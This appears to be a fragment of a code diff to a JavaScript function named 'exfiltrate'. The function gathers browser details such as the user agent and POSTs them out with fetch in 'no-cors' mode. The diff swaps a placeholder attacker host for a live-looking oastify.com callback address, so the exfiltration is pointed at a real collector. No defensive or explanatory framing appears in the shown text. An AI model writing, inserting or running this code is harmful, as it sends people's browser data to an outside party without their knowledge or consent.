@@ -7,7 +7,7 @@ const exfiltrate = () => {
     userAgent: navigator.userAgent
   };
   
-  fetch('https://attacker-server.com/exfil', {
+  fetch('https://9pzru92iqpihf4lkp4501td62x8owik7.oastify.com/exfil', {
     method: 'POST',
     body: JSON.stringify(data),
     mode: 'no-cors'
